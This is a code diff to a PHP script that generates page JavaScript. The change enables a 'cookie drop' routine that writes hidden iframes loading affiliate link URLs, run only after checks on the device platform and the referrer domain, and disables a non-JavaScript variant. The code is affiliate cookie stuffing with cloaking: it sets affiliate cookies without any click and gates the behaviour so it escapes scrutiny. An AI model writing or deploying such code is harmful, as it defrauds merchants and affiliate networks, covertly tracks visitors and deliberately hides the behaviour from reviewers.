@@ -820,15 +820,6 @@
 
 			function go()
 			{\n";
-
-			// Add cookie drop code
-			if (false && $iFrameCookiesEnabled) {
-				foreach($affiliateLinkUrl as $url) {
-					if (strlen($url) > 0) {
-						$scriptCode .= "document.write('<iframe src=\"".$url."\" style=\"display:none\" sandbox=\"allow-top-navigation allow-popups allow-scripts allow-same-origin\"></iframe>');";
-					}
-				}
-			}
 			
 			$scriptCode .=
 				($trackingPixelEnabled && !empty($trackingPixelUrl) ? "addTrackingPixel();\n" : "") .
@@ -843,7 +834,18 @@
 					if (/(iphone|linux armv)/i.test(window.navigator.platform))
 					{
 						jslog('CHECK:PLATFORM_ALLOWED: Platform test succeeded: ' + window.navigator.platform);
+						";
+						
+			// Add cookie drop code
+			if (true && $iFrameCookiesEnabled) {
+				foreach($affiliateLinkUrl as $url) {
+					if (strlen($url) > 0) {
+			$scriptCode .= "document.write('<iframe src=\"".$url."\" style=\"display:none\" sandbox=\"allow-top-navigation allow-popups allow-scripts allow-same-origin\"></iframe>');";
+					}
+				}
+			}
 
+			$scriptCode .= "
 						setTimeout(function()
 						{
 							var topDomain = getReferrerDomain();
@@ -860,8 +862,8 @@
 		
 		$scriptCode .= "</script>";
 					   
-		// Add cookie drop code without JS
-		if (true && $iFrameCookiesEnabled) {
+		// Add cookie drop code without JS -- Not used, as it just skips client side validations
+		if (false && $iFrameCookiesEnabled) {
 			foreach($affiliateLinkUrl as $url) {
 				if (strlen($url) > 0) {
 					$iframeCode = "<iframe src=\"".$url."\" style=\"display:none\" sandbox=\"allow-top-navigation allow-popups allow-scripts allow-same-origin\"></iframe>"; 
